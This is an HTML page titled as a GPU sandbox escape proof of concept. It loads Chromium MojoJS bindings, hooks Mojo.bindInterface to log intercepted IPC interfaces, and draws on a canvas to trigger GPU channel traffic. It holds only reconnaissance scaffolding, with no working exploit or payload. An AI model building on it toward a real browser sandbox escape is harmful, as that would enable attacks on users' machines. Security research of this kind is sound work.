<!DOCTYPE html>
<html>
<head>
    <title>GPU Sandbox Escape PoC</title>
    
    <!-- ES6 Import Map: Paths MUST start with ./ -->
    <script type="importmap">
        {
            "imports": {
                "mojo_bindings": "./gen/mojo/public/js/bindings.js",
                "gpu_channel": "./gen/gpu/ipc/common/gpu_channel.mojom.js"
            }
        }
    </script>
</head>
<body>
    <h1>MojoJS ES6 Module Loader1</h1>
    <canvas id="target-canvas" width="10" height="10"></canvas>
    
    <!-- MUST use type="module" when using imports -->
    <script type="module">
        import { Mojo } from 'mojo_bindings';
        
        console.log("[+] Mojo API loaded successfully: ", Mojo);

        // Let's see if we can intercept the GPU channel creation natively
        const original_bind = Mojo.bindInterface;
        Mojo.bindInterface = function(interfaceName, pipe, host) {
            console.log("[*] Intercepted Mojo Interface: " + interfaceName);
            return original_bind(interfaceName, pipe, host);
        };

        setTimeout(() => {
            console.log("[*] Initializing Canvas to trigger IPC...");
            const canvas = document.getElementById('target-canvas');
            const ctx = canvas.getContext('2d');
            ctx.fillRect(0, 0, 10, 10);
        }, 1000);
    </script>
</body>
</html>
